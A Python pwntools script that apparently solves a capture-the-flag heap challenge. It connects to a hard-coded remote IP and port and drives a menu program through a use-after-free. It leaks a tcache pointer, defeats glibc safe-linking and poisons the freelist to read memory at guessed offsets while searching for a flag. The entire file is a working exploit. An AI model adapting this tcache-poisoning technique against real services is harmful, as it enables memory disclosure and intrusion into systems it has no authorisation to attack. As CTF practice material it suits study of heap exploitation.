#!/usr/bin/env python3
"""
Targeted brute force - just try the most likely offsets
"""
from pwn import *
import sys

context.log_level = 'error'

def try_offset(offset):
    try:
        p = remote('52.76.96.108', 9005, timeout=3)
        p.recvuntil(b'> ')

        # Setup: create, banish, create at same addr, create at new addr
        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'0')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'A'*16 + b'\n')

        p.sendline(b'3'); p.recvuntil(b'index: '); p.sendline(b'0')

        p.sendline(b'4'); p.recvuntil(b'index: '); p.sendline(b'0')
        p.recvuntil(b'data: ')
        data = p.recv(128); p.recv(1)
        fd0 = u64(data[0:8])
        X = fd0 << 12

        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'1')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'B'*16 + b'\n')

        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'2')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'C'*16 + b'\n')

        p.sendline(b'3'); p.recvuntil(b'index: '); p.sendline(b'1')
        p.sendline(b'3'); p.recvuntil(b'index: '); p.sendline(b'2')

        p.sendline(b'4'); p.recvuntil(b'index: '); p.sendline(b'2')
        p.recvuntil(b'data: ')
        data = p.recv(128); p.recv(1)
        fd2 = u64(data[0:8])

        spell2_shifted = fd2 ^ X
        target = X + offset
        protected = spell2_shifted ^ target

        p.sendline(b'2'); p.recvuntil(b'index: '); p.sendline(b'2')
        p.recvuntil(b'data: ')
        p.send(p64(protected) + b'\x00' * 120)

        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'3')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'D'*16 + b'\n')

        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'4')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'\n')

        p.sendline(b'4'); p.recvuntil(b'index: '); p.sendline(b'4')
        p.recvuntil(b'data: ')
        data = p.recv(128); p.recv(1)

        p.close()
        return data
    except:
        try: p.close()
        except: pass
        return None

# Key offsets to try based on heap layout analysis
# g_flag is BEFORE the first spell (X), so offset should be negative
# But also try positive in case I have the direction wrong
offsets = [
    -0x90,     # right before X
    -0x290,    # tcache struct
    -0x2a0,    # tcache struct + g_flag header
    -0x320,    # tcache struct + g_flag chunk
    -0x330,    # tcache struct + g_flag chunk + spell0 header
    -0x1000,   # one page before
    -0x2000,
    -0x10000,
    -0x110000, # near spell 2
    -0x120000,
    -0x130000, # same as spell 2
    -0x130090, # spell 2 - 0x90
    0x90,      # after X
    0x330,
    0x1000,
    0x10000,
    0x110000,
    0x130000,
]

for off in offsets:
    sys.stdout.write(f"offset {hex(off)}: ")
    sys.stdout.flush()
    data = try_offset(off)
    if data is None:
        print("crashed/timeout")
        continue
    if b'flag' in data.lower() or b'CTF' in data or b'{' in data or b'}' in data:
        print(f"FOUND! {data}")
        sys.exit(0)
    non_zero = sum(1 for b in data if b != 0)
    if non_zero > 10:
        print(f"{non_zero} non-zero, data[:32]: {data[:32].hex()}")
    else:
        print(f"{non_zero} non-zero")
